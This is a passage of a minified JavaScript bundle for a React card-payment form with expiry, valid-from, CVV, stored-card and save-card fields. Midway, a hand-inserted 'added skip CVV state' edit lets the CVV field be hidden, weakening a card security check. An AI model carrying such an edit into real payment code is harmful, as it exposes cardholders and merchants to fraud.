                props: r,
                _owner: null
            }
        }
        function We(e, r) {
            var t = (0,
            Ye.A)("".concat(r, "/").concat(e), "YY/MM").add(1, "months")
              , a = (0,
            Ye.A)();
            return t.isValid() && a.isBefore(t)
        }
        function Je(e, r) {
            var t = (0,
            Ye.A)("".concat(r, "/").concat(e), "YY/MM").add(1, "months")
              , a = (0,
            Ye.A)().add(1, "months");
            return t.isValid() && a.isAfter(t)
        }
        function Ue() {
            var e = Ye.A.monthsShort()
              , r = function(e) {
                return e < 10 ? "0".concat(e) : "".concat(e)
            };
            return e.map(function(e, t) {
                return Ve(Xe.A.Option, {
                    value: r(t + 1),
                    label: r(t + 1)
                }, e, "".concat(e, " (").concat(r(t + 1), ") "))
            })
        }
        var Ge, Ze = function(e, r, t) {
            return Array.from({
                length: (r - e) / t + 1
            }, function(r, a) {
                return e + a * t
            }) || []
        }, Ke = function(e) {
            var r = [];
            return e.forEach(function(e) {
                r.push({
                    key: e,
                    value: (0,
                    Ye.A)(e.toString()).format("YY"),
                    label: e
                })
            }),
            r
        };
        function Qe() {
            return Qe = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            Qe.apply(null, arguments)
        }
        function er(e, r, t, a) {
            Ge || (Ge = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: Ge,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var rr = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };
        const tr = function(e) {
            var r, t, a = e.form.getFieldDecorator;
            function n(r, t) {
                e.form.setFields({
                    expiryDate: {
                        value: r,
                        errors: !!t && [new Error((0,
                        p.Ru)("entities.cards.fields.expiryDate.error"))]
                    }
                })
            }
            return c.createElement(le.JF, Qe({
                hasFeedback: e.hasFeedback,
                name: "expiryDate",
                label: e.label ? e.label : ""
            }, rr), er(o.A, {
                gutter: 24
            }, void 0, er(l.A, {
                xs: 12,
                sm: 12,
                md: 12,
                lg: 12,
                xl: 12
            }, void 0, a("expiryDate", {
                rules: [{
                    required: !0,
                    whitespace: !0,
                    message: (0,
                    p.Ru)("entities.cards.fields.expiryDate.error")
                }, {
                    validator: function(r, t, a) {
                        var n = e.form.getFieldValue("expiryYear");
                        t ? "" === n ? a((0,
                        p.Ru)("entities.cards.fields.expiryDate.error")) : We(t, n) ? (e.updateListener(t, oe.tf.ExpMonth),
                        a()) : a((0,
                        p.Ru)("entities.cards.fields.expiryDate.error")) : a()
                    }
                }],
                validateTrigger: "onBlur"
            })(er(Xe.A, {
                size: "large",
                showArrow: !1,
                showSearch: !0,
                showAction: ["focus", "click"],
                allowClear: !0,
                style: {
                    width: "100%"
                },
                placeholder: "MM",
                onChange: function(r) {
                    return e.updateListener(r, oe.tf.ExpMonth)
                },
                optionLabelProp: "label",
                optionFilterProp: "children",
                disabled: e.disabled || !1,
                autoComplete: "off"
            }, void 0, Ue()))), er(l.A, {
                xs: 12,
                sm: 12,
                md: 12,
                lg: 12,
                xl: 12
            }, void 0, a("expiryYear", {
                rules: [{
                    required: !0,
                    whitespace: !0,
                    message: (0,
                    p.Ru)("entities.cards.fields.expiryDate.error")
                }, {
                    validator: function(r, t, a) {
                        var o = e.form.getFieldValue("expiryDate");
                        t ? (o && "" !== o || (n(o, !0),
                        a()),
                        o ? We(o, t) ? (e.updateListener(t, oe.tf.ExpYear),
                        n(o, !1),
                        a()) : (n(o, !0),
                        a()) : a()) : a()
                    }
                }],
                validateTrigger: "onBlur"
            })(er(Xe.A, {
                size: "large",
                showArrow: !1,
                showSearch: !0,
                showAction: ["focus", "click"],
                allowClear: !0,
                style: {
                    width: "100%"
                },
                placeholder: "YYYY",
                onChange: function(r) {
                    return e.updateListener(r, oe.tf.ExpYear)
                },
                optionLabelProp: "label",
                optionFilterProp: "children",
                disabled: e.disabled || !1,
                autoComplete: "off",
                onPaste: function(e) {
                    return e.preventDefault()
                },
                onCopy: function(e) {
                    return e.preventDefault()
                }
            }, void 0, (r = 10,
            t = Ze((0,
            Ye.A)().year(), (0,
            Ye.A)().add(r, "years").year(), 1),
            Ke(t).map(function(e) {
                return Ve(Xe.A.Option, {
                    value: e.value,
                    label: e.key
                }, e.key, e.key)
            })))))))
        };
        var ar, nr = t("ed784cf575b689e93a02");
        function or() {
            return or = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            or.apply(null, arguments)
        }
        function ir(e, r, t, a) {
            ar || (ar = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: ar,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var lr = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };
        const dr = function(e) {
            var r, t, a = e.form.getFieldDecorator;
            function n(r, t) {
                e.form.setFields({
                    validFromDate: {
                        value: r,
                        errors: !!t && [new Error((0,
                        p.Ru)("entities.cards.fields.validFrom.error"))]
                    }
                })
            }
            return c.createElement(nr.JF, or({
                hasFeedback: e.hasFeedback,
                name: "validFromDate",
                label: e.label ? e.label : ""
            }, lr), ir(o.A, {
                gutter: 24
            }, void 0, ir(l.A, {
                xs: 12,
                sm: 12,
                md: 12,
                lg: 12,
                xl: 12
            }, void 0, a("validFromDate", {
                rules: [{
                    required: !1,
                    whitespace: !0,
                    message: (0,
                    p.Ru)("entities.cards.fields.validFrom.error")
                }, {
                    validator: function(r, t, a) {
                        var n = e.form.getFieldValue("validFromDateYear");
                        t ? "" === n ? a((0,
                        p.Ru)("entities.cards.fields.validFrom.error")) : Je(t, n) ? (e.updateListener(t, oe.tf.ValidMonth),
                        a()) : a((0,
                        p.Ru)("entities.cards.fields.validFrom.error")) : a()
                    }
                }],
                validateTrigger: "onBlur"
            })(ir(Xe.A, {
                size: "large",
                showArrow: !1,
                showSearch: !0,
                showAction: ["focus", "click"],
                allowClear: !0,
                style: {
                    width: "100%"
                },
                placeholder: "MM",
                onChange: function(r) {
                    return e.updateListener(r, oe.tf.ValidMonth)
                },
                optionLabelProp: "label",
                optionFilterProp: "children",
                disabled: e.disabled || !1,
                autoComplete: "off"
            }, void 0, Ue()))), ir(l.A, {
                xs: 12,
                sm: 12,
                md: 12,
                lg: 12,
                xl: 12
            }, void 0, a("validFromDateYear", {
                rules: [{
                    required: !1,
                    whitespace: !0,
                    message: (0,
                    p.Ru)("entities.cards.fields.validFrom.error")
                }, {
                    validator: function(r, t, a) {
                        var o = e.form.getFieldValue("validFromDate");
                        t ? (o && "" !== o || (n(o, !0),
                        a()),
                        o ? Je(o, t) ? (e.updateListener(t, oe.tf.ValidYear),
                        n(o, !1),
                        a()) : (n(o, !0),
                        a()) : a()) : a()
                    }
                }],
                validateTrigger: "onBlur"
            })(ir(Xe.A, {
                size: "large",
                showArrow: !1,
                showSearch: !0,
                showAction: ["focus", "click"],
                allowClear: !0,
                style: {
                    width: "100%"
                },
                placeholder: "YYYY",
                onChange: function(r) {
                    return e.updateListener(r, oe.tf.ValidYear)
                },
                optionLabelProp: "label",
                optionFilterProp: "children",
                disabled: e.disabled || !1,
                autoComplete: "off",
                onPaste: function(e) {
                    return e.preventDefault()
                },
                onCopy: function(e) {
                    return e.preventDefault()
                }
            }, void 0, (r = 10,
            (t = Ze((0,
            Ye.A)().subtract(r, "years").year(), (0,
            Ye.A)().year(), 1) || []).reverse(),
            Ke(t).map(function(e) {
                return Ve(Xe.A.Option, {
                    value: e.value,
                    label: e.key
                }, e.key, e.key)
            })))))))
        };
        var cr, sr, ur, fr, pr, mr, br, vr = t("b9914b7f92c0235ea968"), hr = t("9773dc2eb44c297f1299");
        function yr() {
            return yr = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            yr.apply(null, arguments)
        }
        function gr(e, r, t, a) {
            br || (br = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: br,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        function Cr(e, r) {
            return function(e) {
                if (Array.isArray(e))
                    return e
            }(e) || function(e, r) {
                var t = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
                if (null != t) {
                    var a, n, o, i, l = [], d = !0, c = !1;
                    try {
                        if (o = (t = t.call(e)).next,
                        0 === r) {
                            if (Object(t) !== t)
                                return;
                            d = !1
                        } else
                            for (; !(d = (a = o.call(t)).done) && (l.push(a.value),
                            l.length !== r); d = !0)
                                ;
                    } catch (e) {
                        c = !0,
                        n = e
                    } finally {
                        try {
                            if (!d && null != t.return && (i = t.return(),
                            Object(i) !== i))
                                return
                        } finally {
                            if (c)
                                throw n
                        }
                    }
                    return l
                }
            }(e, r) || function(e, r) {
                if (e) {
                    if ("string" == typeof e)
                        return xr(e, r);
                    var t = {}.toString.call(e).slice(8, -1);
                    return "Object" === t && e.constructor && (t = e.constructor.name),
                    "Map" === t || "Set" === t ? Array.from(e) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? xr(e, r) : void 0
                }
            }(e, r) || function() {
                throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }()
        }
        function xr(e, r) {
            (null == r || r > e.length) && (r = e.length);
            for (var t = 0, a = Array(r); t < r; t++)
                a[t] = e[t];
            return a
        }
        var wr = d.A.Group
          , Sr = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        }
          , Ar = (0,c.forwardRef)(function(e,r){
    e.getEndUserId;
    var t = e.getScardAuthToken
      , s = Cr((0,c.useState)(!0), 2)
      , u = s[0]
      , f = s[1]
      , m = Cr((0,c.useState)(!0), 2)
      , v = m[0]
      , h = m[1]
      , y = 12
      , g = e.form.getFieldDecorator;

    // ✅ added skip CVV state
    var cvvState = Cr((0,c.useState)(false), 2),
        skipCvv = cvvState[0],
        setSkipCvv = cvvState[1];
            if (e.selectedPaymentCard && e.selectedPaymentCard.length > 0)
                if (e.selectedPaymentCard[0].id === oe.HS) {
                    var C = e.form.getFieldError(["cardNumber"]);
                    C && !C.rdNumber ? (y = 8,
                    gr(l.A, {
                        xl: y
                    }, void 0, gr(dr, {
                        label: (0,
                        p.Ru)("Valid From Date"),
                        updateListener: e.updateListener,
                        form: e.form,
                        selectedPaymentCard: e.selectedPaymentCard
                    }))) : y = 12
                } else
                    y = 12;
            (0,
            c.useEffect)(function() {
                t && (f(!1),
                h(!1))
            }),
            (0,
            c.useEffect)(function() {
                e.form.getFieldError("cardNumber") && e.selectedPaymentCard && e.selectedPaymentCard.length && e.initializeResponse.stored_cards && e.form.getFieldInstance("cardNumber").state && e.form.getFieldInstance("cardNumber").state.value && e.form.getFieldInstance("cardNumber").state.value.trim().length > parseInt(e.selectedPaymentCard[0].min_length, 10) && e.form.setFields({
                    cardNumber: {
                        value: e.form.getFieldInstance("cardNumber").state.value,
                        errors: !1
                    }
                })
            }, [e.selectedPaymentCard]);
            var x = "";
            x = e.isNewCardPayment ? gr(l.A, {
                xl: 12
            }, void 0, gr(me, {
                label: gr("span", {}, void 0, (0,
                p.Ru)("entities.cards.fields.cardNumber.label"), cr || (cr = gr(le.Cu, {}, void 0, "*"))),
                callFxRequestFromComp: e.callFxRequestFromComp,
                placeholder: "XXXX XXXX XXXX XXXX",
                updateListener: e.updateListener,
                form: e.form,
                selectedCard: e.selectedCard,
                selectedPaymentCard: e.selectedPaymentCard,
                disabled: e.disabled
            })) : gr(l.A, {
                xl: 12
            }, void 0, gr(Se, {
                selectedStoredCard: e.selectedStoredCard,
                onStoredCardSelect: e.onStoredCardSelect,
                activeStoredCards: e.activeStoredCards,
                initializeResponse: e.initializeResponse
            }));
            var w = "";
            return e.activeStoredCards && e.activeStoredCards.card && e.activeStoredCards.card[0] && (w = gr(o.A, {
                gutter: 24
            }, void 0, gr(l.A, {
                xl: 24
            }, void 0, gr(vr.jq, {
                onClick: function() {
                    return e.setNewCardPayment(!e.isNewCardPayment)
                }
            }, void 0, gr("div", {}, void 0, gr(i.A, {
                style: {
                    marginBottom: "7px"
                },
                type: "credit-card",
                theme: "filled"
            })), "\xa0\xa0\xa0", gr("div", {}, void 0, e.isNewCardPayment ? "Use My Stored Card" : "Use A new Card"))))),
            c.createElement(a.A, yr({
                ref: r
            }, {
                labelCol: { span: 0 },
                wrapperCol: { span: 24 }
            }, {
                hideRequiredMark: !0
            }), gr(le.BQ, {
                size: "large"
            }, void 0, gr(o.A, {
                gutter: 24
            }, void 0, x), w, gr(o.A, {
                gutter: 24
            }, void 0, gr(l.A, {
                xl: 12
            }, void 0, gr(Ne, {
                label: gr("span", {}, void 0, (0,
                p.Ru)("entities.cards.fields.firstName.label"), sr || (sr = gr(le.Cu, {}, void 0, "*"))),
                placeholder: (0,
                p.Ru)("entities.cards.fields.firstName.placeHolder"),
                updateListener: e.updateListener,
                form: e.form,
                selectedPaymentCard: e.selectedPaymentCard,
                disabled: e.disabled || !e.isNewCardPayment
            })), gr(l.A, {
                xl: 12
            }, void 0, gr(_e, {
                label: gr("span", {}, void 0, (0,
                p.Ru)("entities.cards.fields.lastName.label"), ur || (ur = gr(le.Cu, {}, void 0, "*"))),
                placeholder: (0,
                p.Ru)("entities.cards.fields.lastName.placeHolder"),
                updateListener: e.updateListener,
                form: e.form,
                selectedPaymentCard: e.selectedPaymentCard,
                disabled: e.disabled || !e.isNewCardPayment
            }))), gr(o.A, {
                gutter: 24
            }, void 0, 

            
            !skipCvv && gr(l.A, { xl: y }, void 0, gr(Be, {
                skipCvv: skipCvv,
                setSkipCvv: setSkipCvv,
                label: gr("span", {}, void 0, (0, p.Ru)("entities.cards.fields.cvv.label")),
                placeholder: "XXX",
                hint: gr(vr.nU, {}, void 0, (0, p.S4)("entities.cards.fields.cvv.hint"), pr || (pr = gr(hr.A, {
                    icon: "cvv_hint",
                    viewBox: "64 102 140 77",
                    width: "130",
                    height: "77"
                }))),
                updateListener: e.updateListener,
                form: e.form,
                selectedPaymentCard: e.selectedPaymentCard,
                disabled: e.disabled
            })),


                gr(l.A, {
                xl: y
            }, void 0, gr(tr, {
                label: gr("span", {}, void 0, (0,
                p.Ru)("entities.cards.fields.expiryDate.label"), mr || (mr = gr(le.Cu, {}, void 0, "*"))),
                updateListener: e.updateListener,
                form: e.form,
                selectedPaymentCard: e.selectedPaymentCard,
                disabled: e.disabled || !e.isNewCardPayment
            })))), e.saveCardOption && c.createElement(c.Fragment, null, !1 === e.maxScardReached ? gr(ie, {}, void 0, gr(o.A, {
                gutter: 8
            }, void 0, e.isNewCardPayment && gr(l.A, {
                span: 12
            }, void 0, gr(n.A, {
                onChange: function() {
                    e.cardInfoChangeHandler(!e.saveCardInfo.show, oe.Mv.SHOW)
                },
                id: "chk-save-store",
                checked: e.saveCardInfo && e.saveCardInfo.show
            }, void 0, gr(ae, {
                display: !0,
                brand: !0
            }, void 0, (0,
            p.Ru)("entities.cards.saveCard.title")))), gr(l.A, {
                span: 12
            }, void 0, gr(n.A, {
                onChange: function() {
                    e.defaultCardHandler(!e.isDefaultCard)
                },
                id: "chk-save-store-defaultCard",
                checked: e.isDefaultCard,
                disabled: e.isNewCardPayment && !(e.saveCardInfo && e.saveCardInfo.show)
            }, void 0, gr(ae, {
                display: !0,
                brand: !0
            }, void 0, (0,
            p.Ru)("entities.cards.saveCard.defaultCard")))))) : gr(ae, {}, void 0, (0,
            p.Ru)("entities.storedCards.maxcard")), gr(b(), {
                className: "demo-content",
                type: ["top", "top"]
            }, void 0, e.saveCardInfo && e.saveCardInfo.show ? gr(wr, {
                size: "large"
            }, void 0, gr(o.A, {}, void 0, gr(l.A, {
                span: 24
            }, void 0, c.createElement(le.JF, yr({
                hasFeedback: !0,
                name: "CardHolderName",
                label: (0,
                p.Ru)("entities.cards.saveCard.label")
            }, Sr), g("name", {
                rules: [{
                    required: !0,
                    pattern: new RegExp(/^[a-zA-Z\s]+$/),
                    message: (0,
                    p.Ru)("entities.cards.saveCard.validations.nameRequired"),
                    whitespace: !0
                }]
            })(gr(d.A, {
                size: "large",
                placeholder: "",
                maxLength: 50,
                setFieldsValue: e.saveCardInfo.name,
                onChange: function(r) {
                    return e.cardInfoChangeHandler(r.target.value, oe.Mv.Name)
                }
            }))))), gr(o.A, {
                gutter: 8
            }, void 0, u ? gr(l.A, {
                span: 12
            }, void 0, c.createElement(le.JF, yr({
                hasFeedback: !0,
                name: "CardHolderName",
                label: "Password"
            }, Sr), g("password", {
                rules: [{
                    required: !0,
                    whitespace: !0,
                    pattern: new RegExp(/^[\S]+$/),
                    message: (0,
                    p.Ru)("entities.cards.saveCard.validations.passwordRequired")
                }, {
                    min: 6,
                    max: 20
                }]
            })(gr(d.A, {
                placeholder: "",
                maxLength: 30,
                type: "password",
                setfieldsvalue: e.saveCardInfo.password,
                onChange: function(r) {
                    return e.cardInfoChangeHandler(r.target.value, oe.Mv.PASSWORD)
                }
            })))) : null, v ? gr(l.A, {
                span: 12
            }, void 0, c.createElement(le.JF, yr({
                hasFeedback: !0,
                name: "CardHolderName",
                label: "Confirm password"
            }, Sr), g("confirm", {
                rules: [{
                    required: !0,
                    whitespace: !0,
                    pattern: new RegExp(/^[\S]+$/),
                    message: (0,
                    p.Ru)("entities.cards.saveCard.confirmPasswordLabel")
                }, {
                    validator: function(r, t, a) {
                        var n = e.form;
                        t && t !== n.getFieldValue("password") ? a((0,
                        p.Ru)("entities.cards.saveCard.validations.passwordInconsistent")) : a()
                    }
                }]
            })(gr(d.A, {
                placeholder: "",
                setfieldsvalue: e.saveCardInfo.confirmPassword,
                type: "password",
                maxLength: 30,
                onChange: function(r) {
                    return e.cardInfoChangeHandler(r.target.value, oe.Mv.CONFIRM_PASSWORD)
                }
            })))) : null)) : null)))
        })
          , Fr = (0,
        f.j8)({
            getScardAuthToken: (0,
            v.Xz)(),
            getEndUserId: (0,
            v.St)(),
            initializeResponse: (0,
            v.qS)()
        })
          , Pr = (0,
        s.Ng)(Fr);
        const kr = a.A.create({
            name: "cardInfo"
        })((0,
        u.Zz)(Pr, c.memo)(Ar))
    }
}]);
